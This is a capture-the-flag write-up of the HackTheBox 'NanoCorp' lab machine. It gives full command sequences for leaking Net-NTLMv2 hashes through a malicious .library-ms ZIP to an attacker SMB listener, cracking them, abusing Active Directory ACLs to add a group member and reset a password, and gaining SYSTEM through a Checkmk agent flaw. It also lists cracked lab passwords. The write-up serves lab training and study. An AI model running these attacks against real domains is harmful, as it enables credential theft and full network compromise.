---
layout: page
title: "HTB: NanoCorp"
subtitle: "CVE-2025-24071 NTLM Leak · BloodHound ACL Abuse · CVE-2024-0670 Checkmk LPE"
permalink: /ctf/writeups/hackthebox/nanocorp/
platform: HackTheBox
machine_name: NanoCorp
difficulty: Hard
os: Windows
date: 2026-06-20
tags: [hackthebox, windows, active-directory, cve-2025-24071, library-ms, net-ntlm-v2, responder, hashcat, bloodhound, bloodyad, protected-users, kerberos, evil-winrm-py, checkmk, cve-2024-0670]
description: "Hard Windows Active Directory machine — craft a malicious ZIP to leak Net-NTLMv2, abuse BloodHound ACL chain, authenticate over Kerberos, and escalate via CVE-2024-0670 in the Checkmk monitoring agent."
---

<div style="background:linear-gradient(135deg,rgba(15,160,70,0.08),rgba(59,130,246,0.06));border:1px solid rgba(15,160,70,0.25);border-radius:12px;padding:1.25rem;margin-bottom:1.5rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.5rem;">
  <div>
    <strong style="color:#4ade80;font-size:1.1rem;">NanoCorp</strong>
    <span style="color:var(--text-muted);margin-left:0.75rem;">HackTheBox · Hard · Windows · Retired 20 Jun 2026</span>
  </div>
  <a href="{{ '/posts/htb-nanocorp/' | relative_url }}" class="btn btn-primary" style="text-decoration:none;font-size:0.85rem;padding:6px 14px;">Full Blog Writeup →</a>
</div>

## 🖥️ Machine Info

| Property | Value |
|----------|-------|
| **IP** | `10.129.243.199` |
| **Domain** | `nanocorp.htb` |
| **DC Hostname** | `DC01` |
| **OS** | Windows Server 2022 |
| **Difficulty** | Hard |
| **Creator** | EmSec |
| **User Blood** | ahos6 · 00:06:48 |
| **Root Blood** | Pyp · 00:39:48 |

---

## 🔍 Recon

20 open TCP ports — full DC fingerprint. Notable: **port 5986** (WinRM SSL, not 5985).

```bash
netexec smb 10.129.243.199 --generate-hosts-file hosts
# 10.129.243.199   DC01.nanocorp.htb nanocorp.htb DC01
```

LDAP check reveals `signing:None` — unsigned LDAP binds accepted (relay-vulnerable, patched after release).

Subdomain discovered from main site: **`hire.nanocorp.htb`** — a job application portal accepting ZIP uploads.

---

## 🎯 Phase 1 — Auth as web_svc (CVE-2025-24071)

The hiring portal decompresses uploaded ZIPs on the server side. When a `.library-ms` file is extracted, Windows Explorer automatically connects to the embedded UNC path — leaking Net-NTLMv2.

```bash
# Build malicious ZIP
uv run exploit.py -i 10.10.14.51 -f payload
# → payload.zip (contains payload.library-ms pointing to attacker SMB)

# Capture with Responder
sudo uv run Responder.py -I tun0

# Upload via hire.nanocorp.htb form
# → Hit arrives within 1-2 minutes
# [SMB] NTLMv2-SSP Username : NANOCORP\web_svc
# [SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f0...
```

```bash
# Crack
hashcat web_svc.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# → dksehdgh712!@#

netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'
# [+] nanocorp.htb\web_svc:dksehdgh712!@#
```

---

## 🗺️ Phase 2 — BloodHound ACL Chain → monitoring_svc

```bash
netexec ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  --dns-server 10.129.243.199 --bloodhound -c all
```

**Attack path:**

```
web_svc ─[AddMember]→ IT_Support ─[ForceChangePassword]→ monitoring_svc ─[RemoteManagement]→ WinRM Shell
```

`monitoring_svc` is in **Protected Users** — NTLM blocked, must use Kerberos.

```bash
# Add web_svc to IT_Support
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  add groupMember IT_Support web_svc

# Reset password
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  set password monitoring_svc '0xdf0xdf.'

# Validate with Kerberos
sudo ntpdate DC01.nanocorp.htb
netexec smb DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k
# [+] nanocorp.htb\monitoring_svc:0xdf0xdf.
```

**Shell (WinRM SSL on port 5986):**

```bash
netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
```

```
PS C:\Users\monitoring_svc\Desktop> cat user.txt
b08297a9************************
```

---

## 🚀 Phase 3 — SYSTEM via CVE-2024-0670 (Checkmk)

```powershell
# Port 6556 → cmk-agent-ctl running as SYSTEM
netstat -ano | findstr 6556
get-process | findstr 4020   # cmk-agent-ctl
```

Checkmk agent processes files from `C:\programdata\checkmk\agent\tmp\` as SYSTEM. `monitoring_svc` can write here.

```powershell
# Drop payload into checkmk tmp dir
upload payload.msi C:\programdata\checkmk\agent\tmp\payload.msi

# Agent runs payload as SYSTEM on next execution cycle
# → arbitrary command execution as NT AUTHORITY\SYSTEM
```

```
C:\Users\Administrator\Desktop> cat root.txt
```

---

## 🔑 Credentials & Flags

| Account | Password | Access |
|---------|----------|--------|
| `web_svc` | `dksehdgh712!@#` | Domain user (cracked from NTLMv2) |
| `monitoring_svc` | `0xdf0xdf.` | WinRM shell (forced reset) |
| `Administrator` | via SYSTEM | Root flag |

---

## 📚 Key Techniques

| Technique | Detail |
|-----------|--------|
| CVE-2025-24071 | `.library-ms` in ZIP → NTLM hash leak on extraction |
| NetNTLMv2 cracking | Hashcat mode 5600 + rockyou |
| BloodHound ACL | AddMember → ForceChangePassword chain |
| Protected Users bypass | Kerberos-only auth with `-k` flag |
| WinRM over SSL | Port 5986 with evil-winrm-py `--ssl` |
| CVE-2024-0670 | Checkmk agent tmp dir → SYSTEM code exec |

---

<a href="{{ '/posts/htb-nanocorp/' | relative_url }}" class="btn btn-primary" style="text-decoration:none;">Read Full Detailed Writeup →</a>
